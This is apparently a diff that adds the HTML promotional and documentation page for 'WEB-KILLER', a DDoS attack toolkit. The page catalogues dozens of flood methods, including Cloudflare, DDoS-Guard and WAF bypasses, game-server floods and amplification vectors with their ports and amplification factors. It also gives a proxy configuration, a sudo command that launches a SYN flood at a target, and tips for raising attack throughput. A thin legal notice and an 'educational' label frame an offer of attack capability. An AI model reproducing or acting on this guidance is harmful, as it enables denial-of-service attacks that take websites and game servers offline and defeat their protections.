+                <tr><td>2</td><td><strong>POST</strong></td><td>HTTP POST with JSON payload</td><td>⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>3</td><td><strong>HEAD</strong></td><td>HTTP HEAD request flood</td><td>⭐</td><td>⭐⭐</td></tr>
+                <tr><td>4</td><td><strong>CFB</strong></td><td>Cloudflare bypass</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>5</td><td><strong>CFBUAM</strong></td><td>Cloudflare UAM bypass</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>6</td><td><strong>BYPASS</strong></td><td>General WAF bypass</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>7</td><td><strong>OVH</strong></td><td>OVH-specific attack</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>8</td><td><strong>STRESS</strong></td><td>High-stress POST flood</td><td>⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>9</td><td><strong>DYN</strong></td><td>Dynamic host attack</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>10</td><td><strong>SLOW</strong></td><td>Slowloris-style attack</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>11</td><td><strong>NULL</strong></td><td>Null user agent attack</td><td>⭐⭐⭐</td><td>⭐⭐</td></tr>
+                <tr><td>12</td><td><strong>COOKIE</strong></td><td>Cookie manipulation</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>13</td><td><strong>PPS</strong></td><td>High packets per second</td><td>⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>14</td><td><strong>EVEN</strong></td><td>Even connection attack</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>15</td><td><strong>GSB</strong></td><td>Google Safe Browsing</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>16</td><td><strong>DGB</strong></td><td>DDoS-Guard bypass</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>17</td><td><strong>AVB</strong></td><td>Anti-virus bypass</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>18</td><td><strong>APACHE</strong></td><td>Apache Range attack</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>19</td><td><strong>XMLRPC</strong></td><td>WordPress XML-RPC</td><td>⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>20</td><td><strong>BOT</strong></td><td>Search engine bot flood</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>21</td><td><strong>BOMB</strong></td><td>HTTP/2 bombardier</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>22</td><td><strong>DOWNLOADER</strong></td><td>Slow download attack</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>23</td><td><strong>KILLER</strong></td><td>Process spawner</td><td>⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+                <tr><td>24</td><td><strong>TOR</strong></td><td>Tor network attack</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr>
+                <tr><td>25</td><td><strong>RHEX</strong></td><td>Random hex attack</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr>
+                <tr><td>26</td><td><strong>STOMP</strong></td><td>HTTP/2 stomp attack</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="l4" class="tab-content">
+        <div class="table-container">
+            <table>
+                <tr><th>#</th><th>Method</th><th>Protocol</th><th>Description</th></tr>
+                <tr><td>1</td><td><strong>TCP</strong></td><td>TCP</td><td>TCP connection flood</td></tr>
+                <tr><td>2</td><td><strong>UDP</strong></td><td>UDP</td><td>UDP packet flood</td></tr>
+                <tr><td>3</td><td><strong>SYN</strong></td><td>TCP</td><td>SYN packet flood (RAW socket)</td></tr>
+                <tr><td>4</td><td><strong>ICMP</strong></td><td>ICMP</td><td>Ping flood (RAW socket)</td></tr>
+                <tr><td>5</td><td><strong>VSE</strong></td><td>UDP</td><td>Valve Source Engine query</td></tr>
+                <tr><td>6</td><td><strong>TS3</strong></td><td>UDP</td><td>TeamSpeak 3 server flood</td></tr>
+                <tr><td>7</td><td><strong>MCPE</strong></td><td>UDP</td><td>Minecraft PE flood</td></tr>
+                <tr><td>8</td><td><strong>FIVEM</strong></td><td>UDP</td><td>FiveM server query</td></tr>
+                <tr><td>9</td><td><strong>FIVEM-TOKEN</strong></td><td>UDP</td><td>FiveM token attack</td></tr>
+                <tr><td>10</td><td><strong>MINECRAFT</strong></td><td>TCP</td><td>Minecraft server flood</td></tr>
+                <tr><td>11</td><td><strong>MCBOT</strong></td><td>TCP</td><td>Minecraft bot flood (with login)</td></tr>
+                <tr><td>12</td><td><strong>CONNECTION</strong></td><td>TCP</td><td>Connection flood</td></tr>
+                <tr><td>13</td><td><strong>CPS</strong></td><td>TCP</td><td>Connections per second</td></tr>
+                <tr><td>14</td><td><strong>OVH-UDP</strong></td><td>UDP</td><td>OVH UDP custom flood</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="amp" class="tab-content">
+        <div class="table-container">
+            <table>
+                <tr><th>#</th><th>Method</th><th>Port</th><th>Amplification Factor</th></tr>
+                <tr><td>1</td><td><strong>DNS</strong></td><td>53</td><td>28-54x</td></tr>
+                <tr><td>2</td><td><strong>NTP</strong></td><td>123</td><td>556x</td></tr>
+                <tr><td>3</td><td><strong>MEM</strong></td><td>11211</td><td>10,000-51,000x</td></tr>
+                <tr><td>4</td><td><strong>CLDAP</strong></td><td>389</td><td>56-70x</td></tr>
+                <tr><td>5</td><td><strong>CHAR</strong></td><td>19</td><td>356x</td></tr>
+                <tr><td>6</td><td><strong>RDP</strong></td><td>3389</td><td>86x</td></tr>
+                <tr><td>7</td><td><strong>ARD</strong></td><td>3283</td><td>75x</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="tools" class="tab-content">
+        <div class="table-container">
+            <table>
+                <tr><th>#</th><th>Tool</th><th>Type</th><th>Description</th></tr>
+                <tr><td>1</td><td><strong>PING</strong></td><td>Tool</td><td>ICMP ping utility</td></tr>
+                <tr><td>2</td><td><strong>CHECK</strong></td><td>Tool</td><td>Website status checker</td></tr>
+                <tr><td>3</td><td><strong>INFO</strong></td><td>Tool</td><td>GeoIP information lookup</td></tr>
+                <tr><td>4</td><td><strong>TSSRV</strong></td><td>Tool</td><td>TeamSpeak server lookup</td></tr>
+                <tr><td>5</td><td><strong>DNS</strong></td><td>Tool</td><td>DNS resolution tool</td></tr>
+                <tr><td>6</td><td><strong>CFIP</strong></td><td>Tool</td><td>Cloudflare IP resolver</td></tr>
+                <tr><td>7</td><td><strong>DSTAT</strong></td><td>Tool</td><td>Network statistics monitor</td></tr>
+            </table>
+        </div>
+    </div>
+</section>
+
+<!-- Documentation Section -->
+<section class="section" id="docs" style="background: var(--darker);">
+    <h2 class="section-title">📚 Documentation</h2>
+    <p class="section-subtitle">Complete reference documentation for WEB-KILLER</p>
+    
+    <div class="card-grid">
+        <div class="card">
+            <div class="card-icon">📖</div>
+            <h3>Getting Started</h3>
+            <p>Step-by-step guide for beginners. Learn how to install, configure, and launch your first attack.</p>
+            <a href="#installation" style="color: var(--primary);">Read Guide →</a>
+        </div>
+        <div class="card">
+            <div class="card-icon">⚙️</div>
+            <h3>Configuration</h3>
+            <p>Detailed explanation of config.json, proxy providers, and advanced settings.</p>
+            <a href="#config" style="color: var(--primary);" onclick="scrollToConfig()">View Config →</a>
+        </div>
+        <div class="card">
+            <div class="card-icon">🎯</div>
+            <h3>Method Reference</h3>
+            <p>Complete documentation of all 57 attack methods with parameters and examples.</p>
+            <a href="#methods" style="color: var(--primary);">View Methods →</a>
+        </div>
+        <div class="card">
+            <div class="card-icon">🔧</div>
+            <h3>Troubleshooting</h3>
+            <p>Common issues and solutions. Fix installation problems, performance issues, and errors.</p>
+            <a href="#troubleshooting" style="color: var(--primary);" onclick="scrollToTroubleshoot()">Get Help →</a>
+        </div>
+    </div>
+
+    <div id="config" style="margin-top: 60px;">
+        <h3>⚙️ Configuration File (config.json)</h3>
+        <div class="code-block">
+            <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <code>
+{
+    <span class="string">"proxy-providers"</span>: [
+        {
+            <span class="string">"url"</span>: <span class="string">"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http"</span>,
+            <span class="string">"type"</span>: 1,
+            <span class="string">"timeout"</span>: 30
+        },
+        {
+            <span class="string">"url"</span>: <span class="string">"https://www.proxy-list.download/api/v1/get?type=socks5"</span>,
+            <span class="string">"type"</span>: 5,
+            <span class="string">"timeout"</span>: 30
+        }
+    ],
+    <span class="string">"MCBOT"</span>: <span class="string">"WEBKILLER_"</span>,
+    <span class="string">"MINECRAFT_DEFAULT_PROTOCOL"</span>: 754
+}
+            </code>
+        </div>
+    </div>
+
+    <div id="troubleshooting" style="margin-top: 60px;">
+        <h3>🔧 Troubleshooting Guide</h3>
+        
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion(this)">❌ ModuleNotFoundError: No module named 'PyRoxy'</div>
+            <div class="accordion-content">
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>
+pip install --upgrade pip
+pip install -r requirements.txt
+<span class="comment"># Or install directly:</span>
+pip install git+https://github.com/MatrixTM/PyRoxy.git
+                    </code>
+                </div>
+            </div>
+        </div>
+        
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion(this)">❌ Permission Denied (RAW sockets)</div>
+            <div class="accordion-content">
+                <p><strong>Windows:</strong> Run CMD as Administrator</p>
+                <p><strong>Linux/Mac:</strong> Use <code>sudo</code></p>
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>sudo python3 run.py SYN target.com:80 50 60</code>
+                </div>
+            </div>
+        </div>
+        
+        <div class="accordion">
+            <div class="accordion-header" onclick="toggleAccordion(this)">❌ Low Performance / Low PPS</div>
+            <div class="accordion-content">
+                <ol>
+                    <li>Increase thread count: <code>--threads 1000</code></li>
+                    <li>Use premium proxies (SOCKS5)</li>
+                    <li>Close other applications</li>
+                    <li>Use wired connection instead of WiFi</li>
+                    <li>Reduce RPC value</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Warning Section -->
+<section class="section">
+    <div class="warning-box">
+        <h3>⚠️ IMPORTANT LEGAL NOTICE</h3>
+        <p>WEB-KILLER is designed <strong>EXCLUSIVELY</strong> for:</p>
+        <ul>
+            <li>✅ Authorized penetration testing</li>
+            <li>✅ Educational research</li>
+            <li>✅ Security assessment</li>
+            <li>✅ Network capacity planning</li>
+            <li>✅ DDoS mitigation testing</li>
+        </ul>
+        <br>
+        <p><strong>MUST NOT</strong> be used for:</p>
+        <ul>
+            <li>❌ Unauthorized attacks</li>
+            <li>❌ Illegal activities</li>
+            <li>❌ Service disruption without permission</li>
+        </ul>
+        <br>
+        <p style="color: #FF0000;"><strong>Violators may face criminal prosecution under 18 U.S.C. § 1030 with up to 10 years imprisonment and $250,000 fines.</strong></p>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h4>⚡ WEB-KILLER</h4>
+            <p>Ultimate DDoS Attack Toolkit v2.1</p>
+            <p>Created for Educational Purposes</p>
+        </div>
+        <div class="footer-col">
+            <h4>Quick Links</h4>
+            <a href="#home">Home</a>
+            <a href="#about">About</a>
+            <a href="#installation">Installation</a>
+            <a href="#usage">Usage</a>
+        </div>
+        <div class="footer-col">
+            <h4>Resources</h4>
+            <a href="#methods">Attack Methods</a>
+            <a href="#docs">Documentation</a>
+            <a href="#troubleshooting">Troubleshooting</a>
+            <a href="https://github.com/Athexblackhat/WEB-KILLER">GitHub</a>
+        </div>
+        <div class="footer-col">
+            <h4>Connect</h4>
+            <a href="#">Discord</a>
+            <a href="#">Telegram</a>
+            <a href="#">GitHub</a>
+        </div>
+    </div>
+    <p style="color: var(--text-dim); margin-top: 40px;">
+        ⚡ Powered by <strong style="color: var(--primary);">ATHEX BLACK HAT</strong> | © 2025 All Rights Reserved | v2.1 PREMIUM EDITION
+    </p>
+</footer>
+
+<script>
+    // Create animated particles
+    const particlesContainer = document.getElementById('particles');
+    for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.classList.add('particle');
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.width = Math.random() * 4 + 2 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.animationDelay = Math.random() * 15 + 's';
+        particle.style.animationDuration = Math.random() * 10 + 10 + 's';
+        particlesContainer.appendChild(particle);
+    }
+
+    // Tab functionality
+    function openTab(evt, tabName) {
+        const tabContents = document.querySelectorAll('.tab-content');
+        const tabButtons = document.querySelectorAll('.tab-btn');
+        
+        tabContents.forEach(content => content.classList.remove('active'));
+        tabButtons.forEach(button => button.classList.remove('active'));
+        
+        document.getElementById(tabName).classList.add('active');
+        evt.currentTarget.classList.add('active');
+    }
+
+    // Accordion functionality
+    function toggleAccordion(header) {
+        header.classList.toggle('active');
+        const content = header.nextElementSibling;
+        content.classList.toggle('active');
+    }
+
+    // Mobile menu toggle
+    function toggleMenu() {
+        document.getElementById('navLinks').classList.toggle('open');
+    }
+
+    // Smooth scroll for internal links
+    function scrollToConfig() {
+        document.getElementById('config').scrollIntoView({ behavior: 'smooth' });
+    }
+    
+    function scrollToTroubleshoot() {
+        document.getElementById('troubleshooting').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // Close mobile menu on link click
+    document.querySelectorAll('.nav-links a').forEach(link => {
+        link.addEventListener('click', () => {
+            document.getElementById('navLinks').classList.remove('open');
+        });
+    });
+</script>
+
+</body>
+</html>
